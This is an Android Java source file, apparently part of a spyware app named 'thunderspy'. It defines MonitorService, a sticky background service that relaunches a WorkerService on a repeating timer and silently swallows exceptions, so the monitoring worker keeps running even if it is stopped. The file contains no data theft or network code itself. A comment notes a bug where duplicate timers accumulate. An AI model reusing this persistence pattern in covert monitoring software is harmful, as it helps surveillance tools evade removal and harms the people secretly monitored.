package com.thunderspy.spy;

import android.app.Service;
import android.content.Intent;
import android.os.Handler;
import android.os.IBinder;

import com.thunderspy.spy.utils.Constants;
import com.thunderspy.spy.utils.ThreadPoolManager;
import com.thunderspy.spy.utils.Utils;
import com.thunderspy.spy.utils.etp.ETPThread;

public class MonitorService extends Service {
    private final int START_MODE = START_STICKY;

    public MonitorService() {

    }

    @Override
    public void onCreate() {
        try {

            /**
             * HAVE A PROBLEM WHEN THIS SERVICE IS RECREATED AND PROCESS IS SAME,
             * THEN THIS TIMER IS CREATED TWICE I.E. TWO TIMER. THEN 3 OR 4, 5, 6...
             * SO USE SOLUTION LIKE SINGLE THREAD IN MONITOR PROCESS LIKE ETPThread class.
             */

            final Handler mainLooperHandler = new Handler(getMainLooper());
            Runnable serviceMonitorHandler = new Runnable() {
                @Override
                public void run() {
                    try {
                        startService(new Intent(getApplicationContext(), WorkerService.class));
                        mainLooperHandler.postDelayed(this, Constants.INTERVAL_FOR_NEXT_START_SERVICE_MONITOR_SERVICE);
                    } catch (Exception exp) {}
                }
            };
            mainLooperHandler.postDelayed(serviceMonitorHandler, Constants.INTERVAL_FOR_NEXT_START_SERVICE_MONITOR_SERVICE);
        } catch (Exception exp) {
            Utils.log("MonitorService Error: %s", exp.getMessage());
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_MODE;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
    @Override
    public boolean onUnbind(Intent intent) {
        return false;
    }
    @Override
    public void onRebind(Intent intent) {

    }
    @Override
    public void onDestroy() {

    }
}
